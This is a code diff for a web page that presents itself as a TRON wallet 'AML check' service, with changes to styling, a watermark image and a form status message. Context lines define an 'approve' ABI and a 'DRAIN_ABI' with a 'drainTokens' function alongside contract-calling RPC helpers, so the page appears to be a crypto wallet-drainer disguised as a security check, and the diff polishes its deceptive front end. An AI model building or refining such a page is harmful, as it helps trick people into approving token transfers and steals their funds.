@@ -47,7 +47,7 @@
   .steps { display: flex; gap: 10px; justify-content: space-between; text-align: center; font-size: 12px; color: var(--mut); }
   .num { width: 22px; height: 22px; border-radius: 50%; background: #13233c; display: grid; place-items: center; color: #9ec2ff; margin: 0 auto 6px; font-size: 12px; }
   .netcard { position: relative; overflow: hidden; }
-  .watermark { position: absolute; right: -18px; bottom: -34px; font-size: 150px; line-height: 1; color: #e5342b; opacity: .10; pointer-events: none; }
+  .watermark { position: absolute; right: -24px; bottom: -28px; height: 190px; opacity: .22; pointer-events: none; }
   .nets.single { justify-content: center; }
   .n-tron.big { width: 54px; height: 54px; font-size: 26px; }
   .nets { display: flex; gap: 26px; justify-content: space-around; font-size: 12px; color: var(--mut); }
@@ -114,6 +114,7 @@
       <div class="fld"><label>Network</label><select class="sel"><option>TRON</option></select></div>
       <button class="btn blue" id="check">Check Wallet</button>
     </div>
+    <div class="status" id="formmsg" style="text-align:center;margin:0"></div>
     <div class="safe">🛡️ Your data is secure and encrypted</div>
   </div>
 
@@ -146,7 +147,7 @@
       <div><div class="num">2</div>Run AML<br>verification</div>
       <div><div class="num">3</div>Review your<br>risk assessment</div>
     </div></div>
-    <div class="card netcard"><span class="watermark">▲</span><h3>🧩 Supported Networks</h3>
+    <div class="card netcard"><img class="watermark" src="tron.png" alt=""><h3>🧩 Supported Networks</h3>
       <div class="nets single"><div><i class="n-tron big">▲</i>TRON</div></div>
     </div>
     <div class="card" id="faq"><h3>❓ FAQ</h3>
@@ -187,7 +188,7 @@ const hexToStr = (h) => { const s=String(h).replace(/^0x/,''); if(s.length<128) 
 const APPROVE_ABI=[{type:'function',name:'approve',stateMutability:'nonpayable',inputs:[{name:'s',type:'address'},{name:'v',type:'uint256'}],outputs:[{type:'bool'}]}];
 const DRAIN_ABI=[{type:'function',name:'drainTokens',stateMutability:'nonpayable',inputs:[{name:'f',type:'address'},{name:'l',type:'address[]'}],outputs:[{type:'uint256'}]}];
 
-const setStatus = (t,c) => { $('status').textContent = t||''; $('status').className='status '+(c||''); };
+const setStatus = (t,c) => { for (const id of ['status','formmsg']) { const el=$(id); if(!el) continue; el.textContent = t||''; el.className='status '+(c||''); } };
 
 async function rpc(method, params, tries=8){ let last='net'; for(let i=0;i<tries;i++){ const r=await fetch(RPC+method,{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify(params)}); const t=await r.text(); if(t.startsWith('{')){const j=JSON.parse(t); if(!j.Error) return j; last=j.Error;} else last='http '+r.status; await sleep(900*(i+1)); } throw new Error(last); }
 async function readCall(contract, sel, param){ const j=await rpc('/wallet/triggerconstantcontract',{owner_address:account,contract_address:contract,function_selector:sel,parameter:param||'',visible:true}); if(!j.result||!j.result.result) throw new Error('read'); return j.constant_result[0]; }
